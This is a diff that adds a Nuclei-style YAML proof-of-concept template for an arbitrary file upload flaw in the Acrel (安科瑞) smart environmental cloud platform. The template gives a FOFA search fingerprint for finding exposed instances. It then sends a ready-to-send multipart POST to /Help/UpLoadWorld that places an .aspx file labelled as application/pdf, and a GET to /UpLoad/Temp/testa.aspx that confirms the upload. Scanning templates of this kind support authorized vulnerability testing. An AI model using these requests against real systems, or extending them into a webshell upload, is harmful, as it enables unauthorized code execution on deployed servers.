@@ -1,0 +1,109 @@
+id: poc-pzacwt3ghssqizm2
+info:
+  name: 安科瑞-智能环保云平台 uploadworld 存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pzacwt3ghssqizm2'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: pzacwt3ghssqizm2
+    fofa: icon_hash="-1201212481" || body="myCss/phone.css"
+http:
+- raw:
+  - 'POST /Help/UpLoadWorld HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0
+
+    Connection: close
+
+    Content-Length: 628
+
+    Content-Type: multipart/form-data; boundary=----fhc8nifu2wn7cspvush5
+
+    Accept-Encoding: gzip, deflate, br
+
+
+    ------fhc8nifu2wn7cspvush5
+
+    Content-Disposition: form-data; name="id"
+
+
+    WU_FILE_0
+
+    ------fhc8nifu2wn7cspvush5
+
+    Content-Disposition: form-data; name="name"
+
+
+    9b1ukpmjr1.aspx
+
+    ------fhc8nifu2wn7cspvush5
+
+    Content-Disposition: form-data; name="type"
+
+
+    application/pdf
+
+    ------fhc8nifu2wn7cspvush5
+
+    Content-Disposition: form-data; name="lastModifiedDate"
+
+
+    Sun Jan 05 2025 19:55:42
+
+    ------fhc8nifu2wn7cspvush5
+
+    Content-Disposition: form-data; name="size"
+
+
+    637
+
+    ------fhc8nifu2wn7cspvush5
+
+    Content-Disposition: form-data; name="file"; filename="testa.aspx"
+
+    Content-Type: application/pdf
+
+
+    123456
+
+    ------fhc8nifu2wn7cspvush5--
+
+
+
+    上传定位：'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /UpLoad/Temp/testa.aspx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
+
+    Cache-Control: max-age=0
+
+    Connection: close
+
+    Cookie: ASP.NET_SessionId=hdeerqwf2fhaxv25ln0gznjz
+
+    Range: bytes=0-100
+
+    Upgrade-Insecure-Requests: 1'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
